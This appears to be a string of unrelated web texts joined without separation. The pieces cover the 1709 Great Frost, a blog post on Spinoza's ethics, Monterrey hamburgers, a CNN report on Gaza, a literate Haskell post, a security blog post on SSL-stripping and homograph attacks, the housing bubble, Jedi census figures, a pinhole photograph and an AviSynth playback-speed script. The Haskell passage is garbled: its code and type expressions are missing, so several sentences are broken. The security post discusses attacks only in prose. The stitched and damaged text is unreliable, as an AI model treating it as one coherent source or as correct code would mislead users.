A three - week freeze was followed by a brief thaw – and then the mercury plunged again and stayed there .
From Scandinavia in the north to Italy in the south , and from Russia in the east to the west coast of France , everything turned to ice .
The sea froze .
Lakes and rivers froze , and the soil froze to a depth of a metre or more .
Livestock died from cold in their barns , chicken ’s combs froze and fell off , trees exploded and travellers froze to death on the roads .
It was the coldest winter in 500 years .
IN ENGLAND they called the winter of 1709 the Great Frost .
In France it entered legend as Le Grand Hiver , three months of deadly cold that ushered in a year of famine and food riots .
In Scandinavia the Baltic froze so thoroughly that people could walk across the ice as late as April .

The bad economy is hitting America right in the stomach .
Consumers have cut back sharply on food spending , shunning restaurants , opting for generic products over brand names , trading in lattes for home - brewed coffee and shopping for bargains .
That is hurting sales and profits at many food processors , grocery chains and restaurants .

This semester I have been teaching Spinoza ’s Ethics to close out the course .
Although I have had bad experiences teaching the Ethics and Leibniz in the past , this year , for some reason , it has been a pure pleasure .
Once you are finally able to penetrate the propositions and their supporting arguments , a beautiful structure begins to emerge , where each proposition builds on the previous proposition , gradually building to greater and greater complexity and taking the reader from truths that are almost self - evident and hardly in need of proof ( e.g. , “ Substance is by nature prior to its affections or qualities ” ) , to surprising and disturbing conclusions ( that nature and God are identical ; that God is not a sovereign ruling over nature and preferring one set of beings over another , but that instead God creates everything that God can create by necessity ; that values and morals are not intrinsic to things , but products of how our bodies relate to other bodies in terms of benefit ; that there are no purposes or ends to nature , only efficient causes ; that God can not be compelled or persuaded to act , but only acts according to the necessity of his own being ; etc ) .
One by one , Spinoza challenges the root claims of traditional theology and organized religion , showing how these claims are in contradiction with God ’s essence .
In developing these arguments he institutes a thorough - going immanent naturalism sans any dimension of transcendence or vertical being .
Spinoza is crafty and devious .
What makes his arguments so ingenious and devious is that unlike the materialistic atheist that simply denies the existence of God on materialistic grounds , Spinoza works within the theological tradition , drawing on definitions inherited directly from Aristotle and Medieval Jewish and Christian theology , painstakingly demonstrating that when these definitions and axioms are followed through logically , they entail these conclusions and no others ( granting , of course , that his arguments are sound ) .
In other words , Spinoza shows that it is theology itself that leads to these conclusions .
As a result , there is something of the uncanny in Spinoza .
Just as Freud ’s unheimlich is a sort of effect of the heimlich , the homely , the familiar , such that what is familiar suddenly presents itself in a completely unfamiliar way – for example , your image in a mirror begins speaking to you and moving about when you are not – Spinoza takes the familiar concepts of theology , retains them , and completely inverts them in a way that renders them thoroughly unfamiliar , unheimlich , and even a bit terrifying .
Not surprisingly , a number of my students immediately gravitate towards questions of morality in relation to Spinoza ’s thought .
If , as Spinoza argues , God does not reward nor punish a person for living a moral life , and if , as Spinoza argues , values are a matter of the relation of our body to other bodies in terms of whether these other bodies increase or diminish our power of acting , and if , as Spinoza argues , God has no preference for what is or is not , for how we live our lives , then how can Spinoza have any place for ethics or morality ?
For example , God creates Jeffrey Dahmer and Dahmer ’s existence follows from God ’s nature as one of the modes that can exist following from the attributes of extension and thought .
Insofar as Dahmer can exist , he therefore must exist by virtue of God ’s absolute infinity and the fact that God ’s activity is limited in no way .
God has no preference for Jesus , Mother Theresa , or Dahmer , but creates all of these modes as they are possible variations of particular attributes ( the essence of substance ) .
Any preference for one mode over another arises not from God ’s will or desire , but from relations among modes themselves .
In other words , one calls Dahmer bad because he diminishes your power of acting by drilling holds in your head and eating your flesh .
In short , Dahmer diminishes your power of acting .

Spinoza ’s ethical philosophy is thus closer to a branch of medicine or health sciences than to a deontological ethical theory based on normative principles .
In this connection , everything follows from his concept of conatus : “ Each thing , in so far as it is in itself , endeavors to persist in its own being ” ( Part III , Prop 6 ) .
Just as I do not eat barbecue three times a day despite the fact , as my students say , it is delicious ( and therefore good in some respect for my body ) , because it causes me to gain weight , threatens heart disease , and makes me fatigued , I strive to act ethically in relation to others because doing so enhances my power of acting and preserves my conatus .
In other words , eating well and exercising , while guaranteeing nothing , increases the probability that I will be healthy and increases my body ’s capacity for acting .
Pursuing knowledge and understanding of true causes diminishes my fear ( by freeing me from superstition ) and increases my ability to control my circumstances .
And treating others well increases the probability that others will treat me well in return ( though it does n’t guarantee this ) , and therefore creates more opportunities for me , more harmonious relations with others , and a greater control of my existence .
As Spinoza will say , “ By virtue and power I mean the same thing ; that is ( Pr. 7 , Part III on conatus ) , virtue , in so far as it is related to man , is man ’s very essence , or nature , in so far as he has power to bring about that which can be understood through the laws of nature ” ( Def. 8 , Part IV ) .
The term “ virtue ” comes from the Latin virtus and “ virtutem “ , referring to moral strength , manliness , valor , excellence , or worth .
It is a translation of the Greek concept of “ ἀρετή ” or “ arete , referring to “ excellence ” .
Thus , far from being a set of prohibitions or limitations , virtue is instead potency or power , an excellence .
The ἀρετή of an eagle , for example , is its keen sight , its swift flight , its prowess hunting , etc .
The question is thus what is ἀρετή for a human being ?
For Spinoza this is , of course , an open question as “ the human body can be affected in many ways by which its power of activity is increased or diminished ; and also in many other ways which neither increase nor diminish its power of activity ” ( Post. 1 , Part III ) , and “ … nobody as yet has determined the limits of the body ’s capabilities ; that is , nobody as yet has learned from experience what the body can and cannot do … ” ( Prop. 2 , Schol . ) .
In other words , there is a sort of Olympian athleticism to Spinoza ’s concept of virtue or power , involving the exploration of the body ’s power or what it can do ( something that would be explored through art , science , reason , politics , friendship , love , engineering , sport , etc. ) .
At the very least , however , social relationships will necessarily be a part of human ἀρετή .
As Spinoza puts it ,
… nothing is more advantageous to man than man .
Men , I repeat , can wish for nothing more excellent for preserving their own being than that they should all be in such harmony in all respects that their minds and bodies should compose , as it were , one mind and one body , and that all together should endeavor as best they can to preserve their own being , and that all together they should aim at the common advantage of all .
From this it follows that men who are governed by reason , that is men who aim at their own advantage under the guidance of reason , see nothing for themselves that they would not desire for the rest of mankind ; and so are just , faithful and honorable .
( Prop. 18 , Schol . )
One need only watch Cast Away with Tom Hanks or an episode of Survivorman with Les Stroud , to see the truth of this .
Les , for example , spends the vast majority of his time searching for food , often failing , leaving little time for anything else .
Thus , as I argued in “ Towards a Critique of the Politics of the Void “ , perhaps the burning question of political philosophy is not that of how a subject of the political is possible , but rather that of how it is possible to form a collective assemblage is possible .
This question becomes especially crucial in an age of commodity fetishism , where our relations to others are masked or recede into the background ( like Heidegger ’s “ worldhood of the world ” ) and take on the appearance of being relations to things or objects , thereby generating a sense of abstract individualism where we experience ourselves as being independent of collective relations .
The question here is one of freedom and bondage , or what increases my power of acting and what diminishes that power .
Collective relations are , in this connection , crucial to promoting the possibility of ἀρετή .
Much to my delight , the student ( who is quite bright ) who raised these concerns immediately responded with the exclamation “ But that is socialist !
Humans are sinful by nature and capitalist ! ”
Here , I think , we encounter one of the fundamental ideological maneuvers in America .
In The Usual Suspects Verbal remarks that the greatest trick the devil ever pulled was convincing the world he does n’t exist .
This is certainly the case with arguments for capitalism and against socialism in the United States .
The unspoken premises of this claim are clear .
Setting aside the fact that Spinoza lived in Amsterdam during the flourishing of the early rise of capitalism ( and , as Negri points out in The Savage Anomaly , appearing to whole - heartedly endorse this economic system ) , the stark alternative the student is drawing is between altruism as a motive of action on the one hand and egoism or self - interest on the other hand .
The claim that humans are , by nature , egoistic is the claim that they only act on behalf of their own personal self - interest , are therefore naturally competitive , and are therefore naturally prone to corruption and deceit .
On the one hand , the position seems to be that socialism is impossible because humans are naturally prone to corruption .
It is odd that this argument is made again and again , despite the fact that , as Naomi Klein in The Shock Doctrine aptly demonstrates in spades ( everyone , really , should read this book ) , neoliberal economic policies again and again lead to rife corruption and brutality , contrary to democracy , despite protestations to the contrary .
The idea is that the only thing that could compel me to live ethically is a fear of punishment or damnation by God , thereby leading me to the conclusion that moral life is in my own selfish self - interest .
Virtue cannot be , as Spinoza argued , “ blessedness ” , where “ blessedness is not the reward of virtue , but virtue itself .
We do not enjoy blessedness because we keep our lusts in check .
On the contrary , it is because we enjoy blessedness that we are able to keep our lusts in check ” ( Prop. 42 , Part V ) .
On the other hand , the argument seems to be that since humans are not altruistic , our only alternative is “ healthy ” capitalism .
However , if there is one thing the free market ideologues in the United States have never understood or admitted , it is that socialism never was and never has been about altruism , but has always been about self - interest .
One does not pursue regulated economies , re-distribution of wealth , worker management , collective struggle , unionization , etc. , out of some special love or selfless altruism directed at one ’s fellow humans , but precisely out of the desire to maximize the conatus or ἀρετή of one ’s own being .
Nothing is more beneficial to humans than other humans .
And through combining my body with the bodies of others , I am able to form a collective assemblage , a common , that enhances both my own power of acting , and our power of acting .
My freedom is therefore deepened and enhanced .
It is enhanced through a distribution of labor that frees up time for all those involved so that other ends might be pursued .
It is enhanced through increased protection from those more powerful than I , who would exploit me and the system to their own benefit .
It is enhanced through companionship through which I build with others , explore ideas , and with whom I create .
What Spinoza presents is thus not an altruism , but an enlightened egoism …
An egoism that is cognizant of our complex relations to the world and others as both constraints and conditions for our freedom and power .
Far from the abolition of individualism and freedom , collective assemblages are the condition for individualism and freedom insofar as the create the space and time whereby it might become possible for me to cultivate and develop myself according to the virtual singularities or tendencies of my own conatus or essence , and by protecting me from my fellow man who might exploit and oppress me .
My freedom or power is grounded in an increased mastery of my world around me which can only be achieved collectively through reason .
Does it come as any surprise that an ideology like neoliberal economics , that produces a squalorly life for so many and such limited freedom and opportunity for the majority , can only sustain itself by filling the heads of the multitudes with superstitious mythologies , and convincing them that what is in fact in their interest is instead a matter of an implausible altruism that would be contrary to their interest ?
As Spinoza remarks , “ …he who seeks the true causes of miracles and is eager to understand the works of nature as a scholar , and not just to gape at them like a fool , is universally considered an impious heretic and denounced by those to whom the common people bow down as interpreters of Nature and gods .
For these people know that the dispelling of ignorance would entail the disappearance of that sense of aw which is the one and only support for their argument and for the safeguarding of their authority or power ” ( Part I , Appendix ) .

What exactly is a hamburguesa estilo Monterrey ?
I visited the Hamburguesas Del Rio location at Avenida Constitucion 1121 Pte. Centro in Monterrey , Mexico to seek the definitive answer to that question .
I had long assumed that the term described a specific Mexican - style set of garnishes , namely the shredded lettuce , chopped onion , sliced tomato , hamburger patty , slice of ham and avocado architecture seen in the photo .
But I was wrong .
A couple of bites revealed that there was something altogether different about the hamburger patty itself .
So I asked the man with the spatula , the intrepid hamburguesero , what went into the meat mix .
Migas ( bread crumbs ) , huevos ( eggs ) , and garlic salt were among the ingredients he listed .
I have since found recipes online that include those items as well as salsa Ingles ( Worcestershire ) , soy sauce , and other seasonings .
Seems like the Mexican hamburger recipe is inspired by the much older and more popular
recipe for albondigas ( meatballs ) .
On the one hand , you could argue that this is a perfectly acceptable style of hamburger .
But on the other hand , I have read that the busiest Carl 's Jr. location on the planet is located in an upscale neighborhood of San Pedro Garza Garcia in Monterrey .
So evidently , the attraction of the unbreaded hamburger is n't lost on the citizens of Monterrey .
But neither have they lost their preference for the garnish style .
When you ask for a hamburguesa estilo Monterrey in Houston , you get a regular burger with the avocados and ham .
I am guessing that in the post - NAFTA era , the hamburguesa estilo Monterrey has developed a split personality .
In Monterrey it means a hamburger with the breading and spices served with the traditional garnishes .
But in the United States , it can also mean a regular all - beef hamburger dressed with a slice of ham and avocados , Monterrey - style .

( CNN ) --
More than 1,300 Palestinians died and about 5,400 others were wounded during Israel 's three - week offensive in Gaza , the Web site of the Palestinian Authority 's Central Bureau of Statistics said Monday .
A Palestinian man Monday prays in the rubble of his home , destroyed during Israel 's offensive in Gaza .
Louay Shabana , head of the agency , said more than 22,000 buildings were damaged or destroyed .
Shabana put the economic destruction at more than $ 1.9 billion .
The fighting largely stopped Sunday with a cease - fire .
Israel has said 13 of its citizens -- including 10 soldiers -- were killed during the offensive , which started December 27 .
Israel said its offensive was aimed at stopping Hamas militants from firing rockets into southern Israel .
Gaza is in need of humanitarian , economic , sanitary and social help as a result of the Israeli attacks , Shabana said .
The attacks destroyed public sector and private buildings in Gaza , affecting even the United Nations Relief and Works Agency 's facilities and halting economic and social services , the statistics agency said .
Watch Palestinians recover bodies from rubble »
Gaza 's gross domestic product was slashed by 85 percent during the 22 days of war , and it could take a year for the economy to recover , the agency said in a preliminary report .
About 80 percent of crops in Gaza were destroyed , according to the agency .
" The pervasive sense here among the population is one of overwhelming grief , so many families have been destroyed in so many ways , " said John Ging , the top United Nations official in Gaza .
Ging , UNRWA 's Gaza director of operations , said the bill could reach " billions of dollars . "
Among the dead were 159 children , two of whom died in an UNRWA school that was shelled Saturday , Ging said .
Gaza 's main border crossings , which Israel often closed in response to Hamas rocket attacks , were open Monday .
Infrastructure repairs were being made , but 400,000 people still had no water , according to Ging .
Streets in some northern Gaza towns were flooded with sewage , and about 50 U.N. facilities were damaged , he said .
More than 170 supply trucks crossed into Gaza on Monday , less than a third of the daily number that crossed in 2005 , said John Holmes , U.N. under - secretary - general for humanitarian affairs and emergency relief coordinator .
Israel tried to avoid civilian casualties in Gaza , a senior Israel Defense Forces officer said in a posting Monday on the IDF Web site .
" This was not a war against the Palestinians , " he said .
" It was an operation of self - defense against Hamas and related terror organizations .
Unfortunately , this task was made extremely difficult by Hamas , as they made the choice to use civilians as human shields . "
Israel began the offensive in response to rocket fire by Hamas militants after showing eight years of restraint , the officer said .
The operation 's goal , he said , " was to improve the security situation in southern Israel , and to facilitate peaceful living for the Israeli civilians living there . "
" We asked ourselves how to accomplish this , and the answer was to hit Hamas hard -- to strike the tunnels , the terrorists themselves , and all of their assets -- in order to prevent them from committing war crimes by firing rockets that target our civilian population , " the officer said .
He said seven rockets have been fired from Gaza into Israel since Sunday 's cease - fire declaration .
" We want to give this cease - fire a chance , but if Hamas chooses not to , we will utilize all of our means , " he said .

The goal today is to implement an impossible Haskell function .
But as this is a literate Haskell post we need to get some boilerplate out of the way :
So back to the impossible function : all monadscome equipped with a function of type .
But it 's well known that you can't " extract elements back out of the monad " because there is no function of type .
So my goal today will be to write such a function .
Clearly the first line of code ought to be :
The rest of the post will fill in the details .
The type declaration tells us what role it plays syntactically , ie .
it tells us how we can write code withthat type checks .
But what should the semantics be ?
For the IO monad an answer is easy to guess .
should executeby reading n integer from stdin , strip of thepart of the the return value and then add 1 to the result .
In fact , Haskell already has a function that does exactly that , .
The goal here is to implementin a way that works with any monad .
What might we expect the value ofto be ?
The value ofsurely must be 1 , 2 or 3 .
But which one ?
And what happens if the list is empty ?
There really is n't any way of answering this while remaining * purely * functional .
But if we were running code on a suitable machine we could fork three threads returning one of 1 , 2 and 3 in each thread , and then collecing th results together in a list .
In other words , we 'd expect the final result to be .
This would makea lot like McCarthy 's ambiguous operator
So it 's clear that we can't interpretas a pure function .
But we could try implementing it on a new abstract machine .
But there 's another approach we could take .
A couple of times I 've talked about a function of typewhereis the typeandis the type with no elements .
This corresponds to double negation elimination in classical logic .
The Curry - Howard isomorphism tells us no such function can be implemented in a pure functional language , but we can translate expressions containing references to such a function into expressions that are completely pure .
This is the so - called CPS translation .
Anyway , I had this idea that we could do something limilar with monads so that we could translate expressions containinginto ordinary Haskell code .
Turns out there 's already a paper on how to do this : Representing Monads by Andrzej Filinski .
To translate all of Haskell this way would be a messy business .
But just for fun I thought I 'd implement a simpler translation for a small subset of Haskell .
It 's simply this :
For a choice of monad m denote the translation of both types and values by T. So x : : a becomes T( x ) : : T( a ) .
The translation is simply :
The important thing is thatof typeis replaced byof typeA great way to translate Haskell code is with Template Haskell .
So here 's some code : Most of the rest is support for some forms of syntactic sugar .
First the infix operators :
And list operations .
For exampleis sugar foritself is just a placeholder that is supposd to be translated away :
If the above is placed in a file called Test.lhs then you can try compiling the following code .
The big omission is the lack of translation for lambda abstractions .
I think that to get this right might requires translating all of the code using - | extract| - from the ground up , not just isolated expressions like those above .
And like with CPS , you lose referential transparency and the order in which expressions are evaluated makes a difference .
Anyway , this is a partial answer to the question posed here on " automonadization " .
I do need to make a post about DNSSEC at some point in the near future .
But for now , I ’d like to deal with the more immediate issue : Moxie ’s SSL break .
You ’ll note that ’s not in quotes .
There ’s a pretty decent temptation to say Moxie ’s attacks do n’t “ count ” .
Some of this comes from the fact that at the end of the day , these are his three attacks :
First , that when a site attempts to upgrade from HTTP to HTTPS , he can suppress the upgrade — possibly throwing in a “ Lock ” favicon which might trick the user .
Second , that there are a surprising number of online banks that still place a HTTPS form on an HTTP page , which can of course be downgraded ( or as I pointed out , sniffed via injected Javascript ) .
Finally , Firefox‘s ( not IE ’s ) defenses against Eric Johannsen ’s IDN vulnerability could be bypassed by registering a domain and acquiring a wildcard cert in .cn .
The first two attacks have been discussed fairly extensively , while the third works in only one of the browsers .
So there ’s some grumbling .
Lets talk about that .
When I gave my DNS Cache Poisoning talk last year , I devoted quite a few slides to the failings of SSL .
To put it simply , there ’s a reason I did n’t consider SSL a sufficient defense for DNS Cache Poisoning .
Indeed , the fact that the 302 Redirect could be replaced with a 200 OK — replacing https://www.paypal.com with http://www.paypal.com — is right there on the first slide .
( His favicon trick is neat though . )
And a few slides later , I ended up quoting my 2006 talk with respect to online banks and their tragic use of weak security forms , replete with cutesy “ lock ” icons .
Obviously I did n’t discover either of these attacks ; they , and the rest of the litany of weaknesses described in my 2008 deck , have long been the sort of failings in SSL that we ’ve all known are pretty deeply problematic .
But , at least the way I look at it , Moxie ’s talk was n’t about some “ l33t new protocol flaw ” in SSL .
He ’s traveled that ground — in 2002 , his finding that a certificate for http://www.badguy.com could sign another certificate for http://www.bank.com via the non-enforcement of Basic Constraints is about as “ l33t ” as it gets .
That ’s been fixed for years though .
This was instead a fairly searing critique about Security UI .
Moxie introduced ( to me anyway ) the concept of Positive vs. Negative Feedback .
Negative Feedback systems occur when the browser detects an out - and - out failure in the cryptography , and posits an error to the user .
In response to the New Zealand bank data , in which 199 of 200 users ignored a negative prompt , browsers have been getting crazier and crazier about forcing users to jump through hoops in order to bypass a certificate error .
The new negative errors are at the point where it is in fact easier to “ balk ” — to stop a web transaction , and move onto something else .
So Moxie ’s putting his energy on the old positive feedback attacks — simply disabling the security , and seeing if anyone notices .
And here he shows up with some pretty astonishing data : Nobody noticed .
To be specific , absolutely 0 % of users presented with missing encryption on important web sites , being asked to provide sensitive financial data to those websites , refused on the basis of missing security .
Wow. 0 % . Seriously .
Why do n’t users “ get it ” ?
The most heartbreaking thing I think from Moxie ’s entire deck is where he shows off what his attack does to Paypal , on an older browser .
Paypal , more than most sites , has some paranoid , whip - smart engineers who really want to ship the most secure web experience possible for their service .
As such , they have what ’s probably the single most widely deployed SSL - only site .
100 % of Paypal can , and must , be retrieved over SSL .
Unless there ’s a bad guy in the way , faking the real Paypal content over HTTP .
Then Paypal looks just like your bank .
That the insecurity of other sites would train users to not expect security on yours , was pretty cool ( if sad ) to see .
Where I do think things went a little off the tracks was when Moxie talked about his ( pretty elegant ) extension of Eric Johannsen ’s IDN attacks .
IDNs , or Internationalized Domain Names , exist to allow other languages the ability to have web sites in their native character sites , rather than shunting everything into ASCII .
What Eric did in 2005 was show that he could acquire a certificate for http://www.paypal.com — with the a being the Cyrillic a — and thus acquire the “ lock ” , apparently linked to a near - pixel - perfect rendering of Paypal ’s address bar .
These so - called “ Homograph ” attacks were dealt with by locking down the rendering of other character sets in the address bar .
The problem — and it ’s worth exploring , because it reflects just how tricky it is to satisfy all those other demands besides security — is that the trivial way to lock down the address bar , to simply ban Chinese and Cyrillic and everything else — has some pretty serious geopolitical implications .
What , America gets to have its domain names , and China does n’t ?
What ’s up with that ?
Different browsers have dealt with this problem in different ways .
I believe the way IE has handled this is to ask the operating system what language the OS is in , and allow Chinese browsers to view Chinese characters , Russian browsers to view Cyrillic characters , and so on .
It appears Firefox handled this instead by saying that domains in *.cn may contain Chinese characters , domains in *.ru may contain Cyrillic characters , and so on .
But nothing stops Moxie , an American , from registering a *.cn domain , acquiring a *.ijjk.cn certificate , and using the Chinese character that looks exactly like a slash to make a fake http://www.bankofwhatever.com/foo/bar/foo.ijjk.cn domain .
It ’s a cute trick .
It ’s also precisely what EV certificates exist to solve .
There ’s an amazing amount of confusion around Extended Validation — EV .
I ca n’t claim innocence here ; I myself was pretty clueless about why they exist until fairly recently .
Here ’s the deal : Forget crazy tricks with chinese characters — bad guys have been registering names along the lines of http://www.bank-of-whatever.com or http://www.bankofwhateverinc.com or http://www.bankofamerica.com.xyzy.com for years , and then acquiring certificates for those names .
Moxie ’s attack is neat , but once you hit the semantic space , there ’s practically an unlimited number of potential namespace collisions .
EV exists , pretty much exclusively , to deal with the problem of these semantic collisions .
It does four things :
1 ) It requires a solid certificate chain , as opposed to one containing MD5 .
2 ) It requires a human lawyer , versed in the laws and language of a particular jurisdiction , to determine the implied corporate relationship from the domain name and declare it valid .
3 ) It applies a green background to the entire address bar ( IE ) or the leftmost side ( Firefox ) , increasing the amount of “ positive feedback ” ( as Moxie puts it ) the user is hoped to demand
4 ) It explicitly inserts the human - lawyer - approved brand identity to the address bar , replete with a jurisdictional declaration .
This also is there to add more positive feedback .
That ’s what EV is for .
It ’s not at all there to deal with domain validated certs for http://www.bankofwhatever.com being incorrectly issued — see Adam Barth and Collin Jackson ’s work in their paper , “ Beware of Finer Grained Origins ” .
It ’s not at all , as Moxie said in his talk , “ Just the validation that CA ’s should have been doing already ” .
Verisign et al have built an extensive , new positive feedback layer to deal with real world phishing attacks that , while not as elegant as Moxie ’s Chinese Slash , were no less effective .
The real question , in the wake of Moxie ’s work , is do we have data that shows users notice the missing green bar , and the missing brand identity ?
Or , even with EV sites , do users still ignore the missing security markings ?
I ’m looking forward to seeing the data .
As capital flooded into the US debt markets in the wake of the Asian financial crisis -- and I think that Asian savers and central banks bear much more of the responsibility for the credit bubble than can be plausibly pinned on either Alan Greenspan or Ben Bernanke - - real interest rates also fell , which made housing an even better deal .
The recency effect kicked in : as the bubble grew , it began to seem more , not less , likely that home prices would continue to rise .
The bandwagon effect also reared its ugly head .
Everyone else was buying a house on potentially catastrophic terms , so it must be safe !
Any self - introspection on the safety of the housing market was also plagued by bias .
Examples of falling house prices were not available to memory ; spectacular coups reaped by coworkers on a two bedroom fixer - upper were .
And in testing their theory of future house prices , people looked for reasons that housing prices might rise -- the many amenities of homeownership wherever they happened to live -- rather than thinking of reasons that it might fall .
Besides , the memory of the stock market crash was extremely recent and vivid .
People began to see a home less as a place to live than an investment , a safe alternative to the risky securities market .
Once they had decided that it was likely to rise , they were overconfident in this assessment , which made them rather careless about the terms under which they signed mortgages .
Lenders went through much the same pattern .
The revolution in credit scoring that took place in the 1990s actually did make lenders better at predicting default risk .
As we moved into the current decade , however , the steady rise of home prices started to skew the numbers .
Borrowers who historically might have defaulted simply sold their house into a rising market , recouping at least the value of their mortgage .
Or they refinanced , getting much better terms because the loan now represented a smaller proportion of the overall value of the house , meaning that lenders were more likely to get all their money back .
As default rates fell , lenders went through the same process borrowers had .
They too , overweighted recent events .
They , too , looked at other people lending and concluded that it was probably safe .
As I think I 've mentioned before , several years ago , I had a conversation with an investment banker who did a lot of debt deals .
As a general thought , he stated that we 'd gotten much better at managing credit risk in the last ten years .
" Have we actually gotten better ? " I asked .
" Or do we just think we 've gotten better . "
" Oh no , we 've really gotten better , " he assured me .
Oops .
Lenders built their risk models around pre-payment risk -- the risk that buyers would refinance their mortgages , making your investment suddenly much less profitable .
That had historically been the main risk of mortgage lending .
As defaults stayed low , year after year , they revised down their expectations of default , viewing the current situation as a " new normal " rather than an unusually rosy time that might eventually regress to the mean .
They tended to be overconfident about the probability that they were right and the boom would continue , making little provision for an eventual rise in defaults , much less what Nassim Taleb calls a " black swan " event , the kind of broad crisis that we see today .
And they attributed the profits thus made to their own brilliance , rather than luck .
Always wanted to be an astronaut ?
Thanks to NASA , you may get your chance - for free .
NASA is offering free anti-gravity flights this summer to anyone with a good idea or product pitch for spaceflight but without the cash to test it , Fox News reports .
The space agency will offer spots to individuals , research groups and institutions who develop ideas " that have potential use in future agency products , " according to NASA .
Past successes of the NASA program include the invention of a special drilling technique designed for lunar - gravity conditions and a nanofluid coolant system that works in different gravities , Fox reports .
Those technologies , however , were created by companies under contract to NASA .
This summer marks the first time non-agency affiliates can take the rides .
Applications for the free flights are being taken by NASA until March 20 .
Flights on the anti-gravity vomit comets will begin this August at Ellington Field in Houston and last about 2 hours .
They 'll also loop upside - down about 50 times - so riders should make sure to pack some Pepto Bismol in their spacesuits .
Nelson Region highest concentration of Jedi
NZ Census capitulates - Jedi Stats for New Zealand 2006 Census
After a long debate with NZ Census over several years , and even after expressing a desire to pay for the information , it has been several months , here it is ..
There are exactly 20,262 of the Jedi faith in NZ , and more than 75 % of those are males .
( 16635 males )
Half of all Jedi are aged 15 - 29 years old , and 54 Jedi are over the age of 65 .
1980 are children or padewan as the Jedi church prefers to call them .
Distribution around NZ regions compares fairly to their populations .
Please click the link below to view the stats in raw format as provided by the department of statistics NZ .
Please note the base information is a bit boring and we have yet to formally correlate this information with baseline stats of how many people actually live within each region defined and age cohort , before we will be able to make the more interesting conclusions about which areas of NZ have the highest concentration .
However , as you can see in the data at a quick glance , there are indeed many Jedis living in all parts of the country and in all age groups and of both sexes , although males are more likely to be a Jedi than females , and typically from an age group who were children at the first release of the Star Wars movies appear to be the largest group .
It was a significant battle to get this information from the NZ statistics department .
Even after a quote request was logged into the system , we were quickly dismissed .
It required alot of arguing to get to the management level who eventually realised that it was an abuse of our rights to freedom of religion that this information should be denied to us .
They had earlier argued that the information was not readily accessible , but considering they had already released information that " about 20000 " people were of the Jedi faith persuasion , it was clear that the data had been correctly " coded " and that they merely need to query their database to obtain the data we required .
Just to reasert our position , we do not believe the NZ Statistics department should make any decision over censureship of information obtained in a census , where that information is requested by orgnisations such as ourselves , and where the data conforms to any privacy rules applied to any mainstream religion .
20000 responses is enough to provide meaningful data .
The Jedi Church is an non profit international organisation .
The Jedi Church were charged $ 452.38 for this information by Statistics NZ .
We hope this information will be proved free of charge at the next census along with all other religions in NZ .

It seems that Democrats are already doing everything they can to spin the coming failure of the soon to be inaugurated Obama administration to create a sustainable recovery from the current deep slump .
Obama himself tries to do this by claiming that if his plans are n't implemented we will face years of crisis .
Paul Krugman for his part tries to again disassociate himself from Obama .
Krugman opposed Obama in the Democratic primaries , which is likely why he did n't get any job in Obama 's administration even though he supported Obama during the general election .
Now Krugman again starts to criticize Obama , claiming that his proposed stimulus package wo n't be big enough ( Krugman did n't think Roosevelt 's New Deal was big enough , so we should n't be surprised by that ) and is too focused on tax cuts relative to spending increases ( " only " 60 % ) .
As Krugman correctly sense that the Obama package wo n't solve the problems , he is already starting to get disassociated from it , so that once the failure becomes apparent , he can say " see I told you so " and " explain " this by saying that Obama 's " New Deal " , like Roosevelt 's , was too small .

It 's hard not to feel enormous gloom in the face of the current economy , and intractable conflicts in Iraq , Iran , Pakistan , Israel , Palestine and Afghanistan .
And yet when you see what technology is doing these days , how can one stay too pessimistic ?
We want to hear what you think about this article .

My digital camera thinks a long exposure is a few seconds .
Sometimes I get out my tripod and fool around with night photography -- it 's amazing what a 30 - second exposure can read in the dark that your eyes can 't !
But 30 seconds -- even 30 minutes -- is nothing .
British photographer Justin Quinnell is making waves with an amazing six month exposure he made in Bristol , England of the sun rising and falling over the city 's famous suspension bridge :
He made the photo not with a fancy digital camera but with an extremely rude , homemade device -- a pinhole camera made from an empty soda can with a . 25 mm hole punched in it and one sheet of photo paper inside .
He strapped it to a telephone pole and left it there for six months , from December 19 , 2007 to June 21 , 2008 .
If those dates sound familiar ( or astronomically significant ) , they are -- they 're the winter and summer solstices , respectively .
The lowest arc in the photo is the sun 's trail on the shortest day of the year , the winter solstice .
The highest arc is the summer solstice .
The lines which are punctuated by dots represent overcast days when the sun penetrated the clouds only intermittently .
From the UK's Telegraph , my favorite detail :
Mr Quinnell , a world - renowned pin-hole camera artist , of Falmouth , Cornwall , said the photograph took on a personal resonance after his father passed away on April 13 - halfway through the exposure .
He says the picture allows him to pinpoint the exact location of the sun in the sky at the moment his father passed away .
A longer exposure is currently in the works , courtesy a San Francisco artist named Jonathan Keats : a 100 - year exposure of a hotel room .

The British peer who invited anti-immigration MP Geert Wilders to London to show his 15 - minute film Fitna says he is shocked by the British government ’s ‘ weak ’ decision to ban the Dutch MP .
Malcom Pearson told Nova tv that while he does not agree with Wilders ’ call for the Koran to be banned , he would ‘ defend his right to say what he has said ’ .
The aim of the film showing at the British upper house of parliament was to encourage discussion and would go ahead without Wilders , Pearson said .
On Tuesday it emerged that the British government had banned Wilders from entering Britain because his presence could be a threat to public order .
The British government ‘ will stop those who want to spread extremism , hatred and violent messages in our communities from coming to our country , ’ the home affairs ministry said in a statement .
Anger
Wilders , who wants an end to Muslim immigration in the Netherlands , is to face legal action for inciting hatred and discrimination .
Dutch MPs are also angered by the ban .
Opposition right - wing Liberal ( VVD ) MP
Hans van Baalen urged foreign minister Maxime Verhagen to increase diplomatic pressure on Britain .
‘ A Dutch MP must be able to travel to another EU country .
Verhagen must make a formal protest , ’ he was quoted as saying .
GroenLinks and D66 MPs urged prime minister Jan Peter Balkenende to raise the issue with the British premier Gordon Brown .
MPs from the coalition Christian Democrat and Labour parties said the situation was ‘ undesirable ’ and disputed the claim that Wilders would be a threat to public order .
This is going to be a small , technical tutorial on how to save a lot of time by watching videos at higher playback rates .
I first read about this idea from my most favorite personal development blog at Steve Pavlina.com .
In his post " Overclock Your Audio Learning " he says that he occasionally listens to audios at 4.1 x .
At this speed 4 hour video / audio can be listened in less 1 hour !
I personally found it impossible to understand anything at 4 x speed .
My optimal listening speed is 1.65 x - 2.1x .
To speed up the videos you will first need to download and install AviSynth .
AviSynth is kind of a video programming language with which you can do all kinds of manipulations to videos programmatically .
If you are on Windows , then during the installation make sure to associate .avs file extension with Windows Media Player and not Notepad .
Next , create this AviSynth script , and place it in the same directory as your video .
Name the script as " speedup.avs " or something similar .
Make sure the extension is " .avs " if you are on Windows !
< strong > file</strong > = " file_name_of_video.avi " < strong>speedup</strong > = 1.65 < strong > pitch</strong > = 100 DirectShowSource ( file ) audio_rate = last.audiorate video_rate = last.framerate AssumeSampleRate(int( audio_rate*speedup ) ) AssumeFPS( video_rate*speedup ) TimeStretch ( pitch = pitch )
